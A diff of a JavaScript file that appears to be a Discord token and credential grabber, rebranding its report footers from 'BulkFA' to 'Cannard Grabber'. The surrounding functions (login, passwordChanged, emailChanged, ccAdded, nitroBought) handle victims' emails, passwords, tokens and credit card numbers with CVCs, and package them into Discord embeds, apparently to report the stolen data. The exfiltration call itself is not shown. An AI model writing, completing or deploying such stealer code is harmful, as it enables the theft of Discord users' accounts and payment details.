@@ -650,7 +650,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'Thanks for using Cannard Grabber ! ',
         },
         thumbnail: {
           url: 'https://cdn.discordapp.com/attachments/985986698972373052/999720563905929346/static.png',
@@ -695,7 +695,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'Cannard Grabber',
         },
       },
     ],
@@ -737,7 +737,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'Cannard Grabber',
         },
       },
     ],
@@ -821,7 +821,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'Cannard',
         },
       },
     ],
@@ -865,7 +865,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'Cannard Grabber',
         },
       },
     ],
